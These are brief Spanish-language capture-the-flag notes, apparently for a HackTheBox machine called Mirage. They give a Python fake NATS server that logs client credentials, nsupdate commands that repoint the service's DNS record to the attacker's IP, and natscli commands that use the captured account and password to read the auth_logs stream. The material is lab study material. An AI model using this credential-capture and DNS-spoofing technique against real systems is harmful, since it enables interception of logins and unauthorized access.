
- Instalo https://github.com/nats-io/natscli
- Creamos un servidos nats fake

```python
import socket

HOST = "0.0.0.0"
PORT = 4222

print(f"[+] Fake NATS Server listening on {HOST}:{PORT}")

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(5)

while True:
    try:
        client, addr = s.accept()
        print(f"[+] Connection from {addr}")
        
        # Send fake INFO – zwingend für NATS Client-Handshake
        info = b'INFO {"server_id":"FAKE",' \
               b'"version":"2.11.0",' \
               b'"auth_required":true}\r\n'
        client.sendall(info)

        # Read potential credentials
        data = client.recv(2048)
        print("[>] Received:")
        print(data.decode(errors='replace'))

        # Optional: Close connection or respond
        # client.sendall(b'-ERR "Authorization Violation"\r\n')
        client.close()

    except Exception as e:
        print(f"[!] Error: {e}")

```

```bash
python3 fake_nats.py
```


- lanzamos el servidor nats victima

```bash
nsupdate

server 10.10.11.78 

update add nats-svc.mirage.htb 3600 A 10.10.14.14 

send
```
- Si no funciona, añadelo al etc/hosts el nats server

## Ver datos del nats

- Montarlo

```bash
nats --server nats://10.10.11.78:4222 \
     --user Dev_Account_A \
     --password 'hx5h7F5554fP@1337!' \
     consumer add auth_logs test --pull --ack explicit

```

- Leer mensajes
```bash
nats --server nats://10.10.11.78:4222 \
     --user Dev_Account_A \
     --password 'hx5h7F5554fP@1337!' \
     consumer next auth_logs test --count=10

```
